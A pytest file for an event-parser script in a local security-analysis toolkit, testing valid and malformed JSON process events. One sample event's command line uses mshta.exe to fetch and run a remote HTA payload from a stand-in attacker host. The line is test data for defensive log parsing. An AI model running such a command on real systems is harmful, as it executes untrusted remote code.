import json
import subprocess
import sys
from pathlib import Path

ROOT = Path(__file__).resolve().parents[2]
SCRIPT = ROOT / "06-local-analysis-toolkit" / "event-parser.py"


def test_parse_valid_json(tmp_path):
    payload = [{
        "timestamp": "2026-10-28T14:02:00Z",
        "event_id": 1,
        "computer": "LAB-WS-01",
        "process_name": "mshta.exe",
        "pid": 4021,
        "ppid": 2214,
        "parent_process_name": "powershell.exe",
        "parent_process_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "process_path": "C:\\Windows\\System32\\mshta.exe",
        "command_line": "mshta.exe http://evil.example/payload.hta",
        "user": "LAB\\user01",
        "process_guid": "{ABC}",
    }]
    p = tmp_path / "sample.json"
    p.write_text(json.dumps(payload), encoding="utf-8")
    result = subprocess.run([sys.executable, str(SCRIPT), "--input", str(p)], capture_output=True, text=True, check=True)
    assert "mshta.exe" in result.stdout


def test_parse_malformed_json(tmp_path):
    p = tmp_path / "bad.json"
    p.write_text('{"timestamp": "bad"', encoding="utf-8")
    result = subprocess.run([sys.executable, str(SCRIPT), "--input", str(p)], capture_output=True, text=True)
    assert result.returncode != 0
    assert "Malformed JSON" in result.stderr or "Malformed JSON" in result.stdout
